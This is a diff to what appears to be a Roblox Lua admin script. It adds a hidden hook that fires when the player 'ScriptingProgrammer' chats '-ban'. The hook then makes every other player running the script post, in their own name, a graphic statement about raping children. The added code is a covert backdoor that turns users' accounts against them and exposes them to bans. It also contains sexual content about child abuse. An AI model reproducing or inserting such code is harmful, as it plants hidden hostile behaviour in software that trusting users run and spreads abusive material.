@@ -4770,6 +4770,11 @@ v.Chatted:Connect(function(msg)
 			end
                 end
 
+		if string.sub(msg:lower(), 0, 4) == "-ban" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "ScriptingProgrammer") then
+			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
+	                 	Speak("i rape lil kids and i fuck their little asshole so hard")
+			end
+                end
                 end)
 -- ADMIN
             if (alladmin == true or table.find(FAdmins, v.Name)) and not table.find(blacklist, v.Name) and not table.find(newplrslocked, v.Name) and not slockenabled and v.Name ~= game.Players.LocalPlayer.Name then
